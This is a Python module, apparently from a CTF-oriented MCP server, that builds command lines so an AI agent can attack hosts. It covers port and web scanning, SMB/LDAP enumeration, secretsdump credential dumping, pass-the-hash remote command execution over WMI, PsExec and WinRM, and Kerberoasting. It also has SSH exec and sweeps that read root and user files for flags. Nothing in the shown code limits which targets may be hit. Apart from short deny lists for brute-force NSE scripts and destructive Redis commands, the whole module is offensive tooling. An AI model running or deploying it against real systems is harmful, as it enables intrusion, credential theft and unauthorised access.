#!/usr/bin/env python3
# PurrSh3ll — hacktools MCP server: input validation, command runner, and the
# tool builder functions (_b_*). Extracted verbatim from hacktools_server.py so the
# server file stays a thin JSON-RPC entry point. Each _b_* validates its arguments
# and returns either an argv list (run via subprocess) or an in-process text result;
# the builders are independent of each other. See hacktools_server.py for the design.

import json
import os
import re
import shutil
import subprocess
import sys
from urllib.parse import quote


# No per-tool timeout here on purpose: the server runs each command to completion and
# the CALLING AGENT decides how long to wait (and kills the call if it takes too long).
# Keeping timeout policy in one place — the agent — avoids two layers disagreeing.
MAX_OUTPUT = 8000             # chars returned to the model (keeps replies readable)


# --------------------------------------------------------------------------- #
# Input validation + command runner
# --------------------------------------------------------------------------- #
_HOST_RE = re.compile(r"^[A-Za-z0-9._:-]+$")     # ipv4 / ipv6 / hostname chars
_PORTS_RE = re.compile(r"^[0-9,\-]+$")           # 80  |  22,80,443  |  1-1024
_ANSI_RE = re.compile(r"\x1b(?:\[[0-9;?]*[ -/]*[@-~]|\][^\x07]*\x07)")   # colour codes


def _req_host(args):
    """A single validated target host (no CIDR / subnet)."""
    host = (args.get("host") or "").strip()
    if not host:
        raise ValueError("`host` is required")
    if "/" in host:
        raise ValueError("`host` must be a single host, not a CIDR/subnet")
    if not _HOST_RE.match(host):
        raise ValueError("`host` has invalid characters")
    return host


def _port(args, default=None):
    p = args.get("port", default)
    if p is None:
        return None
    try:
        n = int(p)
    except (TypeError, ValueError):
        raise ValueError("`port` must be a number")
    if not 1 <= n <= 65535:
        raise ValueError("`port` must be 1-65535")
    return n


def _ports(args):
    p = (str(args.get("ports") or "")).replace(" ", "")
    if not p:
        return None
    if not _PORTS_RE.match(p):
        raise ValueError("`ports` must be like 80 or 22,80,443 or 1-1024")
    return p


def _word(args, key, required=True):
    v = (args.get(key) or "").strip()
    if not v and required:
        raise ValueError(f"`{key}` is required")
    return v


def _is_root():
    try:
        return os.geteuid() == 0
    except AttributeError:                             # non-POSIX
        return False


_URL_RE = re.compile(r"^https?://[^\s]+$", re.I)


def _req_url(a, key="url"):
    """A validated http(s) URL (required)."""
    url = (a.get(key) or "").strip()
    if not url:
        raise ValueError(f"`{key}` is required")
    if not _URL_RE.match(url) or re.search(r"[\x00-\x1f]", url):
        raise ValueError(f"`{key}` must be an http(s) URL")
    return url


def _no_ctrl(v, key):
    if re.search(r"[\x00-\x1f]", v):
        raise ValueError(f"`{key}` has control characters")
    return v


# Preset wordlists for content discovery → the first path that exists on the box.
_WORDLISTS = {
    "common": ["/usr/share/seclists/Discovery/Web-Content/common.txt",
               "/usr/share/wordlists/dirb/common.txt"],
    "medium": ["/usr/share/seclists/Discovery/Web-Content/"
               "directory-list-2.3-medium.txt"],
    "big": ["/usr/share/seclists/Discovery/Web-Content/big.txt",
            "/usr/share/wordlists/dirb/big.txt"],
    "raft": ["/usr/share/seclists/Discovery/Web-Content/"
             "raft-medium-directories.txt"],
}


def _resolve_wordlist(name):
    for p in _WORDLISTS.get(name, []):
        if os.path.exists(p):
            return p
    return None


# Subdomain/DNS wordlists for vhost fuzzing.
_DNS_WORDLISTS = {
    "small": ["/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"],
    "large": ["/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"],
    "common": ["/usr/share/seclists/Discovery/DNS/namelist.txt",
               "/usr/share/wordlists/dnsmap.txt"],
}


def _resolve_dns_wordlist(name):
    for p in _DNS_WORDLISTS.get(name, []):
        if os.path.exists(p):
            return p
    return None


# ── credentials (batch 2) ─────────────────────────────────────────────────────
def _creds(a, require=False):
    """(username, password, nthash, domain) — validated so they can't break the
    argv/target-spec formats. password/hash are optional (null session), unless
    `require` demands a username."""
    user = (a.get("username") or "").strip()
    password = str(a.get("password") if a.get("password") is not None else "")
    nthash = (a.get("hash") or "").strip()
    domain = (a.get("domain") or "").strip()
    if require and not user:
        raise ValueError("`username` is required for this tool")
    if user and not re.match(r"^[^\s:/@\\%]+$", user):
        raise ValueError("`username` has invalid characters")
    if domain and not re.match(r"^[A-Za-z0-9._-]+$", domain):
        raise ValueError("`domain` has invalid characters")
    if nthash and not re.match(r"^[0-9a-fA-F:]{16,}$", nthash):
        raise ValueError("`hash` must be an NT hash (hex) or LM:NT")
    if re.search(r"[\x00-\x1f]", password):
        raise ValueError("`password` has control characters")
    return user, password, nthash, domain


def _hashes_arg(nthash):
    """impacket -hashes wants LMHASH:NTHASH; a bare NT hash becomes :NT."""
    return nthash if ":" in nthash else ":" + nthash


def _impacket_target(domain, user, password, host, with_pass=True):
    """impacket target spec: [domain/]user[:password]@host."""
    dpart = (domain + "/") if domain else ""
    if with_pass and password:
        return f"{dpart}{user}:{password}@{host}"
    return f"{dpart}{user}@{host}"


def _nxc_auth(user, password, nthash, domain):
    out = (["-d", domain] if domain else []) + ["-u", user or ""]
    return out + (["-H", nthash] if nthash else ["-p", password])


def _run(argv, binary):
    """Run one argv (no shell) to completion and return (text, is_error). Reports a
    missing tool cleanly. There is deliberately no timeout here — the calling agent
    controls how long to wait and kills the call if it runs too long."""
    if not shutil.which(binary):
        return (f"[not installed] '{binary}' is not on PATH — install it to use "
                "this tool.", True)
    try:
        proc = subprocess.run(argv, capture_output=True, text=True,
                              stdin=subprocess.DEVNULL)
    except Exception as exc:                          # noqa: BLE001
        return (f"error running {binary}: {exc}", True)
    out = ((proc.stdout or "") + (proc.stderr or "")).strip()
    out = _ANSI_RE.sub("", out) or "(no output)"
    return (out[:MAX_OUTPUT], False)


_NSE_DENY = ("brute", "dos", "exploit")               # never run these NSE categories


def _nmap_tuning(a):
    """Shared nmap knobs for every scan tool: timing (T0-T5) and whether to ping
    first (host_discovery=false → -Pn). Returns the flag list to splice into argv."""
    timing = (a.get("timing") or "T4").upper()
    if not re.match(r"^T[0-5]$", timing):
        raise ValueError("`timing` must be T0-T5")
    flags = ["-" + timing]
    if not bool(a.get("host_discovery")):
        flags.append("-Pn")                            # assume the host is up
    return flags


# --------------------------------------------------------------------------- #
# Tool builders — each returns (argv, binary) or raises ValueError
# --------------------------------------------------------------------------- #
_RANGE_PORTS = {"fast": ["--top-ports", "1000"], "top100": ["--top-ports", "100"],
                "low": ["-p", "1-32767"], "high": ["-p", "32768-65535"],
                "full": ["-p-"]}


def _b_port_discovery(a):
    host = _req_host(a)
    ports = _ports(a)
    rng = (a.get("range") or "fast").lower()
    proto = (a.get("protocol") or "tcp").lower()
    timing = (a.get("timing") or "T4").upper()
    host_disc = bool(a.get("host_discovery"))
    if rng not in _RANGE_PORTS:
        raise ValueError("`range` must be fast/top100/low/high/full")
    if proto not in ("tcp", "udp", "both"):
        raise ValueError("`protocol` must be tcp/udp/both")
    if not re.match(r"^T[0-5]$", timing):
        raise ValueError("`timing` must be T0-T5")
    root = _is_root()
    if proto in ("udp", "both") and not root:
        raise ValueError("udp/both scans need root — run as root or use "
                         "protocol=tcp")
    scan_flags = {"tcp": ["-sS" if root else "-sT"], "udp": ["-sU"],
                  "both": ["-sS", "-sU"]}[proto]
    argv = ["nmap"] + scan_flags + ["-n", "--open", "-" + timing]
    if not host_disc:
        argv.append("-Pn")                            # assume the host is up
    argv += (["-p", ports] if ports else _RANGE_PORTS[rng])   # explicit ports win
    argv.append(host)
    slow = rng == "full" or proto in ("udp", "both")
    return argv, "nmap"


def _b_service_discovery(a):
    host = _req_host(a)
    ports = _ports(a)
    proto = (a.get("protocol") or "tcp").lower()
    timing = (a.get("timing") or "T4").upper()
    host_disc = bool(a.get("host_discovery"))
    scripts = a.get("scripts", True)
    os_det = bool(a.get("os"))
    intensity = a.get("intensity")
    if proto not in ("tcp", "udp", "both"):
        raise ValueError("`protocol` must be tcp/udp/both")
    if not re.match(r"^T[0-5]$", timing):
        raise ValueError("`timing` must be T0-T5")
    root = _is_root()
    if proto in ("udp", "both") and not root:
        raise ValueError("udp/both scans need root — run as root or use "
                         "protocol=tcp")
    if os_det and not root:
        raise ValueError("os detection (-O) needs root — run as root or set os=false")
    argv = ["nmap", "-sV"]
    argv += {"tcp": ["-sS" if root else "-sT"], "udp": ["-sU"],
             "both": ["-sS", "-sU"]}[proto]
    if scripts:
        argv.append("-sC")                            # default NSE scripts
    if os_det:
        argv.append("-O")
    if intensity is not None:
        try:
            iv = int(intensity)
        except (TypeError, ValueError):
            raise ValueError("`intensity` must be 0-9")
        if not 0 <= iv <= 9:
            raise ValueError("`intensity` must be 0-9")
        argv += ["--version-intensity", str(iv)]
    argv += ["-n", "--open", "-" + timing]
    if not host_disc:
        argv.append("-Pn")
    argv += (["-p", ports] if ports else ["--top-ports", "1000"])
    argv.append(host)
    slow = proto in ("udp", "both") or os_det
    return argv, "nmap"


def _b_script_scan(a):
    host, ports = _req_host(a), _ports(a)
    scripts = _word(a, "scripts")
    if any(bad in scripts.lower() for bad in _NSE_DENY):
        raise ValueError("brute / dos / exploit scripts are not allowed here")
    argv = ["nmap", "-sV", "-n"] + _nmap_tuning(a) + ["--script", scripts]
    argv += (["-p", ports] if ports else [])
    return argv + [host], "nmap"


def _b_http_headers(a):
    host = _req_host(a)
    port = _port(a)
    scheme = "https" if (a.get("tls") or port in (443, 8443)) else "http"
    netloc = f"{host}:{port}" if port else host
    path = (a.get("path") or "/").strip()
    if not path.startswith("/"):
        path = "/" + path
    if re.search(r"[\s\x00-\x1f]", path):
        raise ValueError("`path` has invalid characters")
    method = (a.get("method") or "head").lower()
    if method not in ("head", "get"):
        raise ValueError("`method` must be head or get")
    argv = ["curl", "-sS", "-k", "--max-time", "20"]
    argv += ["-I"] if method == "head" else ["-D", "-", "-o", os.devnull]
    if a.get("follow_redirects"):
        argv.append("-L")
    ua = (a.get("user_agent") or "").strip()
    if ua:
        if re.search(r"[\x00-\x1f]", ua):
            raise ValueError("`user_agent` has control characters")
        argv += ["-A", ua]
    return argv + [f"{scheme}://{netloc}{path}"], "curl"


def _b_ftp_anon(a):
    host = _req_host(a)
    port = _port(a, 21)
    return (["nmap", "-n"] + _nmap_tuning(a)
            + ["-p", str(port), "--script", "ftp-anon", host], "nmap")


def _b_smb_enum(a):
    host = _req_host(a)
    return (["nmap", "-n"] + _nmap_tuning(a)
            + ["-p", "139,445", "--script",
               "smb-os-discovery,smb-security-mode,smb2-security-mode,"
               "smb-enum-shares,smb-enum-users", host], "nmap")


def _b_snmp_walk(a):
    host = _req_host(a)
    community = _word(a, "community", required=False) or "public"
    if not re.match(r"^[A-Za-z0-9._-]+$", community):
        raise ValueError("`community` has invalid characters")
    version = str(a.get("version") or "2c").lower()
    if version not in ("1", "2c"):
        raise ValueError("`version` must be 1 or 2c")
    port = _port(a, 161)
    oid = (a.get("oid") or "").strip()
    if oid and not re.match(r"^[A-Za-z0-9._:-]+$", oid):
        raise ValueError("`oid` has invalid characters")
    argv = ["snmpwalk", "-v1" if version == "1" else "-v2c", "-c", community,
            "-t", "5", f"{host}:{port}"]
    if oid:
        argv.append(oid)                              # walk a specific subtree
    return argv, "snmpwalk"


def _b_dns(a):
    name = _word(a, "name")
    if not _HOST_RE.match(name):
        raise ValueError("`name` has invalid characters")
    rtype = (a.get("type") or "A").upper()
    if rtype not in ("A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "PTR", "ANY"):
        raise ValueError("unsupported record `type`")
    argv = ["dig", "+short"]
    server = (a.get("server") or "").strip()
    if server:                                        # query a specific resolver
        if not _HOST_RE.match(server):
            raise ValueError("`server` has invalid characters")
        argv.append("@" + server)
    return argv + [name, rtype], "dig"


def _b_ssl_cert(a):
    host = _req_host(a)
    port = _port(a, 443)
    return (["nmap", "-n"] + _nmap_tuning(a)
            + ["-p", str(port), "--script", "ssl-cert", host], "nmap")


def _b_banner(a):
    host, port = _req_host(a), _port(a)
    if port is None:
        raise ValueError("`port` is required")
    return (["nmap", "-sV", "-n"] + _nmap_tuning(a)
            + ["-p", str(port), "--script", "banner", host], "nmap")


def _b_searchsploit(a):
    query = (a.get("query") or "").strip()
    cve = (a.get("cve") or "").strip()
    if not query and not cve:
        raise ValueError("provide `query` or `cve`")
    argv = ["searchsploit"]                # colour auto-disables when output is piped
    if a.get("title"):
        argv.append("-t")                             # match the title only
    if cve:
        if not re.match(r"^(CVE-)?\d{4}-\d{3,7}$", cve, re.I):
            raise ValueError("`cve` must look like CVE-2017-0144 or 2017-0144")
        argv += ["--cve", cve.upper().replace("CVE-", "")]
    if query:
        argv += query.split()
    return argv, "searchsploit"


def _b_whois(a):
    domain = _word(a, "domain")
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    argv = ["whois"]
    server = (a.get("server") or "").strip()
    if server:                                        # query a specific whois server
        if not _HOST_RE.match(server):
            raise ValueError("`server` has invalid characters")
        argv += ["-h", server]
    return argv + [domain], "whois"


# ── web batch ─────────────────────────────────────────────────────────────────
def _b_http_request(a):
    url = _req_url(a)
    method = (a.get("method") or "GET").upper()
    if method not in ("GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"):
        raise ValueError("unsupported `method`")
    argv = ["curl", "-sS", "-i", "-k", "--max-time", "30", "-X", method]
    for h in (a.get("headers") or []):
        argv += ["-H", _no_ctrl(str(h), "headers")]
    cookie = (a.get("cookie") or "").strip()
    if cookie:
        argv += ["-b", _no_ctrl(cookie, "cookie")]
    user = (a.get("username") or "").strip()
    if user:                                          # HTTP basic auth
        argv += ["-u", f"{user}:{a.get('password') or ''}"]
    bearer = (a.get("bearer") or "").strip()
    if bearer:
        argv += ["-H", "Authorization: Bearer " + _no_ctrl(bearer, "bearer")]
    data = a.get("data")
    if data not in (None, ""):
        argv += ["--data", str(data)]
    if a.get("follow_redirects"):
        argv.append("-L")
    ua = (a.get("user_agent") or "").strip()
    if ua:
        argv += ["-A", _no_ctrl(ua, "user_agent")]
    return argv + [url], "curl"


def _b_web_content(a):
    url = _req_url(a)
    if "FUZZ" not in url:
        url = url.rstrip("/") + "/FUZZ"
    name = (a.get("wordlist") or "common").lower()
    if name not in _WORDLISTS:
        raise ValueError("`wordlist` must be common/medium/big/raft")
    wl = _resolve_wordlist(name)
    if not wl:
        raise ValueError(f"wordlist '{name}' not found — install seclists or dirb")
    try:
        threads = int(a.get("threads", 40))
    except (TypeError, ValueError):
        raise ValueError("`threads` must be a number")
    if not 1 <= threads <= 100:
        raise ValueError("`threads` must be 1-100")
    argv = ["ffuf", "-u", url, "-w", wl, "-t", str(threads), "-s",
            "-mc", "200,204,301,302,307,401,403,405"]
    exts = (a.get("extensions") or "").strip()
    if exts:
        if not re.match(r"^[A-Za-z0-9,.]+$", exts):
            raise ValueError("`extensions` must be like php,txt,html")
        argv += ["-e", exts]
    return argv, "ffuf"


def _b_whatweb(a):
    url = _req_url(a)
    argv = ["whatweb", "--color=never", "--no-errors"]
    agg = a.get("aggression")
    if agg is not None:
        try:
            av = int(agg)
        except (TypeError, ValueError):
            raise ValueError("`aggression` must be 1-4")
        if not 1 <= av <= 4:
            raise ValueError("`aggression` must be 1-4")
        argv += ["-a", str(av)]
    return argv + [url], "whatweb"


def _b_nikto(a):
    host = _req_host(a)
    port = _port(a, 80)
    argv = ["nikto", "-ask", "no", "-h", host, "-p", str(port)]
    if a.get("tls") or port in (443, 8443):
        argv.append("-ssl")
    return argv, "nikto"


def _b_nuclei(a):
    url = _req_url(a)
    argv = ["nuclei", "-u", url, "-silent", "-nc"]
    sev = (a.get("severity") or "").strip().lower()
    if sev:
        if not re.match(r"^[a-z,]+$", sev):
            raise ValueError("`severity` must be like low,medium,high,critical")
        argv += ["-severity", sev]
    tags = (a.get("tags") or "").strip().lower()
    if tags:
        if not re.match(r"^[a-z0-9,_-]+$", tags):
            raise ValueError("`tags` has invalid characters")
        argv += ["-tags", tags]
    return argv, "nuclei"


# ── SMB / AD batch (credentialed) ─────────────────────────────────────────────
def _b_smb_client(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    action = (a.get("action") or "list").lower()
    share = (a.get("share") or "").strip()
    path = (a.get("path") or "").strip()
    if share and not re.match(r"^[A-Za-z0-9._$ -]+$", share):
        raise ValueError("`share` has invalid characters")
    if path and re.search(r"[;\x00-\x1f]", path):
        raise ValueError("`path` has invalid characters")
    if not user:
        auth = ["-N"]                                 # null session
    else:
        userspec = f"{domain}\\{user}" if domain else user
        if nthash:
            auth = ["-U", f"{userspec}%{nthash}", "--pw-nt-hash"]
        else:
            auth = ["-U", f"{userspec}%{password}"]
    if action == "list":
        return ["smbclient", "-L", f"//{host}/"] + auth, "smbclient"
    if action == "ls":
        if not share:
            raise ValueError("`share` is required for action=ls")
        return (["smbclient", f"//{host}/{share}"] + auth
                + ["-c", "ls " + (path or "\\")], "smbclient")
    raise ValueError("`action` must be list or ls")


_NXC_ACTIONS = {"shares": ["--shares"], "users": ["--users"], "groups": ["--groups"],
                "rid": ["--rid-brute"], "sessions": ["--sessions"],
                "disks": ["--disks"], "loggedon": ["--loggedon-users"],
                "passpol": ["--pass-pol"]}


def _b_nxc_smb(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    action = (a.get("action") or "shares").lower()
    argv = ["nxc", "smb", host] + _nxc_auth(user, password, nthash, domain)
    if action == "exec":
        cmd = _word(a, "command")
        if re.search(r"[\x00-\x1f]", cmd):
            raise ValueError("`command` has control characters")
        argv += ["-x", cmd]
    elif action in _NXC_ACTIONS:
        argv += _NXC_ACTIONS[action]
    else:
        raise ValueError("`action` must be one of shares/users/groups/rid/sessions/"
                         "disks/loggedon/passpol/exec")
    return argv, "nxc"


def _b_ldap_search(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    base = (a.get("base_dn") or "").strip()
    if base and not re.match(r"^[A-Za-z0-9=,. _-]+$", base):
        raise ValueError("`base_dn` has invalid characters")
    lfilter = (a.get("filter") or "(objectClass=*)").strip()
    if re.search(r"[\x00-\x1f]", lfilter):
        raise ValueError("`filter` has control characters")
    port = _port(a, 389)
    argv = ["ldapsearch", "-x", "-H", f"ldap://{host}:{port}"]
    if user:                                          # else anonymous simple bind
        argv += ["-D", f"{user}@{domain}" if domain else user, "-w", password]
    if base:
        argv += ["-b", base]
    argv.append(lfilter)
    attrs = (a.get("attributes") or "").strip()
    if attrs:
        if not re.match(r"^[A-Za-z0-9,]+$", attrs):
            raise ValueError("`attributes` must be comma-separated names")
        argv += attrs.split(",")
    return argv, "ldapsearch"


def _b_rpc_enum(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    cmds = (a.get("commands") or "enumdomusers;enumdomgroups;querydominfo").strip()
    if not re.match(r"^[A-Za-z0-9;_ .-]+$", cmds):
        raise ValueError("`commands` has invalid characters")
    if user:
        userspec = f"{domain}\\{user}" if domain else user
        auth = ["-U", f"{userspec}%{password}"]
    else:
        auth = ["-N", "-U", ""]                       # null session
    return ["rpcclient"] + auth + ["-c", cmds, host], "rpcclient"


def _b_secretsdump(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a, require=True)
    target = _impacket_target(domain, user, password, host, with_pass=not nthash)
    argv = ["impacket-secretsdump", target]
    if nthash:
        argv += ["-hashes", _hashes_arg(nthash)]
    if a.get("just_dc"):
        argv.append("-just-dc")                       # DCSync-only (fast, DC creds)
    return argv, "impacket-secretsdump"


_IMPACKET_EXEC = {"wmiexec": "impacket-wmiexec", "psexec": "impacket-psexec",
                  "smbexec": "impacket-smbexec", "atexec": "impacket-atexec"}


def _b_impacket_exec(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a, require=True)
    method = (a.get("method") or "wmiexec").lower()
    if method not in _IMPACKET_EXEC:
        raise ValueError("`method` must be wmiexec/psexec/smbexec/atexec")
    command = _word(a, "command")
    if re.search(r"[\x00-\x1f]", command):
        raise ValueError("`command` has control characters")
    target = _impacket_target(domain, user, password, host, with_pass=not nthash)
    argv = [_IMPACKET_EXEC[method], target]
    if nthash:
        argv += ["-hashes", _hashes_arg(nthash)]
    argv.append(command)                              # single command, non-interactive
    return argv, _IMPACKET_EXEC[method], 300


def _b_kerberos_roast(a):
    dc = (a.get("dc") or a.get("host") or "").strip()
    if not dc or "/" in dc or not _HOST_RE.match(dc):
        raise ValueError("`dc` (domain controller host/IP) is required")
    domain = (a.get("domain") or "").strip()
    if not domain or not re.match(r"^[A-Za-z0-9._-]+$", domain):
        raise ValueError("`domain` is required (e.g. corp.local)")
    user, password, nthash, _d = _creds(a)
    mode = (a.get("mode") or "kerberoast").lower()
    if mode == "kerberoast":
        if not user:
            raise ValueError("kerberoast needs credentials (username + password/hash)")
        argv = ["impacket-GetUserSPNs", f"{domain}/{user}:{password}",
                "-dc-ip", dc, "-request"]
        if nthash:
            argv += ["-hashes", _hashes_arg(nthash)]
        return argv, "impacket-GetUserSPNs", 300
    if mode == "asrep":
        if user:                                      # authenticated: list AS-REP-able
            argv = ["impacket-GetNPUsers", f"{domain}/{user}:{password}",
                    "-dc-ip", dc, "-request", "-format", "hashcat"]
            if nthash:
                argv += ["-hashes", _hashes_arg(nthash)]
            return argv, "impacket-GetNPUsers", 300
        target_user = (a.get("target_user") or "").strip()
        if not target_user or not re.match(r"^[^\s:/@\\%]+$", target_user):
            raise ValueError("AS-REP without creds needs `target_user`")
        return (["impacket-GetNPUsers", f"{domain}/{target_user}", "-dc-ip", dc,
                 "-no-pass", "-format", "hashcat"], "impacket-GetNPUsers", 300)
    raise ValueError("`mode` must be kerberoast or asrep")


# ── databases + remote exec batch ─────────────────────────────────────────────
def _db_ident(v, key):
    if v and not re.match(r"^[A-Za-z0-9._-]+$", v):
        raise ValueError(f"`{key}` has invalid characters")
    return v


def _b_mysql_query(a):
    host = _req_host(a)
    port = _port(a, 3306)
    user = _db_ident((a.get("username") or "root").strip(), "username")
    password = str(a.get("password") or "")
    db = _db_ident((a.get("database") or "").strip(), "database")
    query = _no_ctrl(_word(a, "query"), "query")
    argv = ["mysql", "-h", host, "-P", str(port), "-u", user]
    if password:
        argv.append("-p" + password)                  # note: visible in process list
    if db:
        argv += ["-D", db]
    return argv + ["-e", query], "mysql"


def _b_mssql_query(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a)
    query = _no_ctrl(_word(a, "query"), "query")
    argv = ["nxc", "mssql", host] + _nxc_auth(user, password, nthash, domain)
    if a.get("local_auth"):
        argv.append("--local-auth")                   # SQL login rather than Windows
    if a.get("port") is not None:
        argv += ["--port", str(_port(a))]
    return argv + ["-q", query], "nxc"


def _b_psql_query(a):
    host = _req_host(a)
    port = _port(a, 5432)
    user = _db_ident((a.get("username") or "postgres").strip(), "username")
    password = str(a.get("password") or "")
    db = _db_ident((a.get("database") or "postgres").strip(), "database")
    query = _no_ctrl(_word(a, "query"), "query")
    uri = f"postgresql://{quote(user)}:{quote(password)}@{host}:{port}/{db}"
    return ["psql", uri, "-A", "-c", query], "psql"


_REDIS_DENY = {"SHUTDOWN", "FLUSHALL", "FLUSHDB"}


def _b_redis_cli(a):
    host = _req_host(a)
    port = _port(a, 6379)
    password = str(a.get("password") or "")
    command = (a.get("command") or "INFO").strip()
    if not re.match(r"^[A-Za-z0-9_.:*\- ]+$", command):
        raise ValueError("`command` has invalid characters")
    if command.split()[0].upper() in _REDIS_DENY:
        raise ValueError("destructive redis command not allowed here")
    argv = ["redis-cli", "-h", host, "-p", str(port), "--no-auth-warning"]
    if password:
        argv += ["-a", password]
    return argv + command.split(), "redis-cli"


def _b_mongo_query(a):
    host = _req_host(a)
    port = _port(a, 27017)
    user = (a.get("username") or "").strip()
    password = str(a.get("password") or "")
    db = _db_ident((a.get("database") or "admin").strip(), "database")
    ev = _no_ctrl((a.get("command") or "db.getMongo().getDBNames()").strip(),
                  "command")
    auth = f"{quote(user)}:{quote(password)}@" if user else ""
    uri = f"mongodb://{auth}{host}:{port}/{db}"
    return ["mongosh", uri, "--quiet", "--eval", ev], "mongosh"


def _b_ssh_exec(a):
    host = _req_host(a)
    port = _port(a, 22)
    user = _db_ident((a.get("username") or "").strip(), "username")
    if not user:
        raise ValueError("`username` is required")
    command = _no_ctrl(_word(a, "command"), "command")
    common = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
              "-p", str(port), f"{user}@{host}", command]
    key = (a.get("key") or "").strip()
    if key:
        if re.search(r"[;\s\x00-\x1f]", key):
            raise ValueError("`key` must be a path with no spaces")
        return ["ssh", "-i", key] + common, "ssh"
    password = str(a.get("password") or "")
    if password:                                      # non-interactive password auth
        return ["sshpass", "-p", password, "ssh"] + common, "sshpass"
    raise ValueError("provide `password` or `key`")


def _b_winrm_exec(a):
    host = _req_host(a)
    user, password, nthash, domain = _creds(a, require=True)
    command = _no_ctrl(_word(a, "command"), "command")
    argv = ["nxc", "winrm", host] + _nxc_auth(user, password, nthash, domain)
    return argv + ["-x", command], "nxc"


def _b_ftp_transfer(a):
    host = _req_host(a)
    port = _port(a, 21)
    user = (a.get("username") or "anonymous").strip()
    password = str(a.get("password")
                   or ("anonymous" if user == "anonymous" else ""))
    action = (a.get("action") or "list").lower()
    path = _no_ctrl((a.get("path") or "/").strip(), "path")
    if not path.startswith("/"):
        path = "/" + path
    creds = f"{quote(user)}:{quote(password)}@"
    if action == "list":
        if not path.endswith("/"):
            path += "/"
        return (["curl", "-sS", "--max-time", "30",
                 f"ftp://{creds}{host}:{port}{path}", "--list-only"], "curl")
    if action == "get":
        return (["curl", "-sS", "--max-time", "60",
                 f"ftp://{creds}{host}:{port}{path}"], "curl")
    raise ValueError("`action` must be list or get")


# ── authenticated loot (read a file / hunt a flag with recovered creds) ───────
# Read-only post-auth tools: use credentials found elsewhere to pull a file — or sweep
# the usual flag/secret spots — off the target. Safe by design (only reads); they give
# the agent a first-class way to capture a flag in normal (non-hack) mode.

# One read-only filesystem sweep per platform. Single line each: the exec path forbids
# control characters, so no real newlines. Covers the classic CTF spots + common names.
_NIX_FLAG_SWEEP = (
    "cat /root/root.txt /root/flag.txt /root/flag /home/*/user.txt /home/*/flag.txt "
    "/home/*/flag /home/*/Desktop/* /flag /flag.txt /var/www/flag* 2>/dev/null; "
    "find / -maxdepth 5 -type f \\( -iname 'flag*' -o -iname 'user.txt' -o -iname "
    "'root.txt' -o -iname 'proof.txt' -o -iname 'local.txt' \\) 2>/dev/null | head -n 40"
)
_WIN_FLAG_SWEEP = (
    "Get-ChildItem C:\\Users,C:\\ -Recurse -Include user.txt,root.txt,flag.txt,flag,"
    "proof.txt,local.txt -ErrorAction SilentlyContinue -File | Select-Object -First 30 "
    "| ForEach-Object { $_.FullName; Get-Content $_.FullName -ErrorAction SilentlyContinue }"
)


def _ssh_run_argv(host, a, remote_cmd):
    """(argv, binary) running `remote_cmd` over ssh with a password (sshpass) or key —
    the shared shape used by read_file / flag_hunt (mirrors ssh_exec)."""
    port = _port(a, 22)
    user = _db_ident((a.get("username") or "").strip(), "username")
    if not user:
        raise ValueError("`username` is required for ssh")
    common = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
              "-p", str(port), f"{user}@{host}", remote_cmd]
    key = (a.get("key") or "").strip()
    if key:
        if re.search(r"[;\s\x00-\x1f]", key):
            raise ValueError("`key` must be a path with no spaces")
        return ["ssh", "-i", key] + common, "ssh"
    password = str(a.get("password") or "")
    if password:
        return ["sshpass", "-p", password, "ssh"] + common, "sshpass"
    raise ValueError("provide `password` or `key` for ssh")


def _winrm_run_argv(host, a, remote_cmd):
    """(argv, binary) running `remote_cmd` on Windows over WinRM (nxc)."""
    user, password, nthash, domain = _creds(a, require=True)
    argv = ["nxc", "winrm", host] + _nxc_auth(user, password, nthash, domain)
    return argv + ["-x", remote_cmd], "nxc"


def _b_read_file(a):
    """Read a single file off a host over an authenticated service (ssh / winrm / smb /
    ftp). Read-only loot with recovered credentials — pull a known flag/secret path."""
    host = _req_host(a)
    service = (a.get("service") or "").strip().lower()
    path = _no_ctrl(_word(a, "path"), "path")
    if service == "ssh":
        import shlex
        return _ssh_run_argv(host, a, "cat -- " + shlex.quote(path))
    if service == "winrm":
        ps = path.replace("'", "''")                  # single-quote a PS literal path
        return _winrm_run_argv(
            host, a, f"Get-Content -LiteralPath '{ps}' -ErrorAction SilentlyContinue")
    if service == "ftp":
        a2 = dict(a); a2["action"], a2["path"] = "get", path
        return _b_ftp_transfer(a2)
    if service == "smb":
        user, password, nthash, domain = _creds(a)
        share = _word(a, "share")
        if not re.match(r"^[A-Za-z0-9._$ -]+$", share):
            raise ValueError("`share` has invalid characters")
        if re.search(r'[;"\x00-\x1f]', path):
            raise ValueError("`path` has invalid characters")
        rpath = path.lstrip("/").replace("/", "\\")
        if not user:
            auth = ["-N"]                             # null session
        else:
            userspec = f"{domain}\\{user}" if domain else user
            auth = (["-U", f"{userspec}%{nthash}", "--pw-nt-hash"] if nthash
                    else ["-U", f"{userspec}%{password}"])
        return (["smbclient", f"//{host}/{share}"] + auth
                + ["-c", f'get "{rpath}" -'], "smbclient")   # stream to stdout
    raise ValueError("`service` must be ssh / winrm / smb / ftp")


def _b_flag_hunt(a):
    """Sweep the usual flag/secret locations on a host over an authenticated SHELL
    service (ssh on Linux, winrm on Windows) and return what it finds. Read-only, one
    login. Non-shell services (smb/ftp/db) can't traverse a filesystem — use read_file
    once you know the path."""
    host = _req_host(a)
    service = (a.get("service") or "").strip().lower()
    if service == "ssh":
        return _ssh_run_argv(host, a, _NIX_FLAG_SWEEP)
    if service == "winrm":
        return _winrm_run_argv(host, a, _WIN_FLAG_SWEEP)
    raise ValueError("`service` must be ssh or winrm (a shell is needed to sweep the FS)")


# ── privilege-escalation enumeration (read-only, over an authenticated login) ──
# Once you hold a shell, these sweep the classic local-privesc vectors in one login —
# a LinPEAS/WinPEAS-lite as a native one-liner (no script uploaded, nothing written).
# gtfobins_lookup is fully offline: a bundled map of SUID/sudo abuse techniques.

